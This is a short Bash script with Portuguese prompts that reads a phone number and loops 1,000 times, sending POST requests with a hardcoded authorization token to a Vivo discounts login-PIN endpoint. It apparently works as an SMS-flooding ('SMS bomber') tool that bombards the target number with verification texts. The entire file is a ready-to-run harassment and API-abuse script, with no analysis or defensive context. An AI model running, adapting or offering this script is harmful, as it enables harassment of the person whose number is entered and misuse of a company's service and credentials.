#!/bin/bash

echo "Numero do Celular: "
read telefone

for i in {1..1000}
do

curl -X POST "https://www.vivodescontos.com.br/discount-api/v1/login/pin/msisdn/$telefone?channel=WEB&identifier=web" -H "Authorization: token b09207f5c299c42708e1badb72c04025" -H "Accept: application/json, text/plain, */*"

sleep 1

done
